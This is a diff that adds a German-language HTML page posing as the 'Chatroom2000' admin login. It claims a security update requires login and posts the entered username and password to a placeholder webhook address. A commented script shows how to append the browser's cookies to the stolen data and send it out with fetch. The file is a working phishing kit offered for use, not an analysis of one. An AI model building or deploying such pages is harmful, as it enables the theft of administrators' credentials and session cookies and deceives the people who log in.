@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chatroom2000 – Admin Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #e0e0e0;
+        }
+        .container {
+            background: rgba(0,0,0,0.7);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0,255,255,0.3);
+            width: 380px;
+            text-align: center;
+            border: 1px solid #00ffff;
+        }
+        h1 {
+            color: #00ffff;
+            margin-bottom: 10px;
+            font-size: 28px;
+            text-shadow: 0 0 10px #00ffff;
+        }
+        .subtitle {
+            color: #a0a0a0;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #00ffff;
+            border-radius: 6px;
+            background: rgba(255,255,255,0.05);
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 10px #00ffff;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 20px;
+            background: linear-gradient(90deg, #00ffff, #00b7ff);
+            border: none;
+            border-radius: 6px;
+            color: black;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #00ffff;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Chatroom2000 Admin-Login</h1>
+        <p class="subtitle">Sicherheitsupdate erforderlich – bitte einloggen</p>
+        
+        <form id="phishForm" action="https://dein-webhook-url.de/log" method="POST">
+            <input type="text" name="username" placeholder="Admin-Benutzername" required autocomplete="off">
+            <input type="password" name="password" placeholder="Passwort" required autocomplete="off">
+            <button type="submit">Login</button>
+        </form>
+
+        <div class="footer">
+            © 2026 Chatroom2000 – Alle Rechte vorbehalten
+        </div>
+    </div>
+
+    <script>
+        // Optional: Sende Cookies mit
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            // Du kannst hier noch Cookies hinzufügen, z.B.:
+            // e.preventDefault();
+            // let formData = new FormData(this);
+            // formData.append('cookies', document.cookie);
+            // fetch(this.action, {method: 'POST', body: formData});
+        });
+    </script>
+</body>
+</html>
